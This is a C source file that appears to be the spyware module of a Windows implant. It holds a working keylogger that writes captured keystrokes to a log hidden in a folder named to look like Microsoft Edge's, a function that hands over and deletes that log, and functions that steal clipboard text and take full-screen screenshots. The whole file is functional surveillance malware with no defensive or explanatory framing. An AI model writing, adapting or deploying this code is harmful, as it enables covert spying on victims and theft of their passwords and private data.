#include "spyware.h"
#include "implant_utils.h"
#include "platform.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>

#define KEYLOG_FILE "C:\\Users\\Public\\MicrosoftEdge\\kl.dat"

static volatile int g_kl_run = 0;

static DWORD WINAPI keylogger_thread(LPVOID arg)
{
    (void)arg;
    FILE *fp = NULL;
    int key;

    while (g_kl_run) {
        SLEEP(0.01); /* High frequency polling */
        for (key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                fp = fopen(KEYLOG_FILE, "a");
                if (fp) {
                    if (key == VK_RETURN) fprintf(fp, "\n");
                    else if (key == VK_SPACE) fprintf(fp, " ");
                    else if (key == VK_BACK) fprintf(fp, "[BACKSPACE]");
                    else if (key >= 0x30 && key <= 0x39) fprintf(fp, "%c", key);
                    else if (key >= 0x41 && key <= 0x5A) fprintf(fp, "%c", key);
                    else if (key == VK_SHIFT) fprintf(fp, "[SHIFT]");
                    else if (key == VK_CONTROL) fprintf(fp, "[CTRL]");
                    else if (key == VK_CAPITAL) fprintf(fp, "[CAPSLOCK]");
                    fclose(fp);
                }
            }
        }
    }
    return 0;
}

void spy_keylog_start(void)
{
    if (!g_kl_run) {
        g_kl_run = 1;
        plat_thread_t kl_thread;
        THREAD_START(&kl_thread, keylogger_thread, NULL);
        THREAD_DETACH(&kl_thread);
    }
}

void spy_keylog_stop(void)
{
    g_kl_run = 0;
}

char *spy_keylog_dump(int *len_out)
{
    char *data = read_file_heap_plain(KEYLOG_FILE, len_out);
    if (data) {
        remove(KEYLOG_FILE);
    }
    return data;
}

char *spy_clipboard_get(int *len_out)
{
    if (!OpenClipboard(NULL)) return NULL;
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (!hData) { CloseClipboard(); return NULL; }
    char *text = (char *)GlobalLock(hData);
    if (!text) { CloseClipboard(); return NULL; }
    int len = (int)strlen(text);
    char *out = malloc(len + 1);
    if (out) { memcpy(out, text, len); out[len] = '\0'; *len_out = len; }
    GlobalUnlock(hData);
    CloseClipboard();
    return out;
}

char *spy_screenshot_capture(int *len_out)
{
    int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
    BitBlt(hDC, 0, 0, width, height, hScreen, x1, y1, SRCCOPY);

    BITMAPINFO bmi;
    memset(&bmi, 0, sizeof(bmi));
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;

    int image_size = width * height * 3;
    char *buffer = malloc(image_size);
    if (!buffer) {
        SelectObject(hDC, old_obj);
        DeleteDC(hDC);
        ReleaseDC(NULL, hScreen);
        DeleteObject(hBitmap);
        return NULL;
    }

    GetDIBits(hDC, hBitmap, 0, height, buffer, &bmi, DIB_RGB_COLORS);

    /* Construct BMP in memory */
    BITMAPFILEHEADER bfh;
    memset(&bfh, 0, sizeof(bfh));
    bfh.bfType = 0x4D42;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize = bfh.bfOffBits + image_size;

    int total_size = bfh.bfSize;
    char *final_buffer = malloc(total_size);
    if (final_buffer) {
        memcpy(final_buffer, &bfh, sizeof(bfh));
        memcpy(final_buffer + sizeof(bfh), &bmi.bmiHeader, sizeof(BITMAPINFOHEADER));
        memcpy(final_buffer + bfh.bfOffBits, buffer, image_size);
        *len_out = total_size;
    }

    free(buffer);
    SelectObject(hDC, old_obj);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);
    DeleteObject(hBitmap);
    return final_buffer;
}

#else
/* Stub implementations for non-Windows platforms */
void spy_keylog_start(void) {}
void spy_keylog_stop(void) {}
char *spy_keylog_dump(int *len_out) { *len_out = 0; return NULL; }
char *spy_clipboard_get(int *len_out) { *len_out = 0; return NULL; }
char *spy_screenshot_capture(int *len_out) { *len_out = 0; return NULL; }
#endif
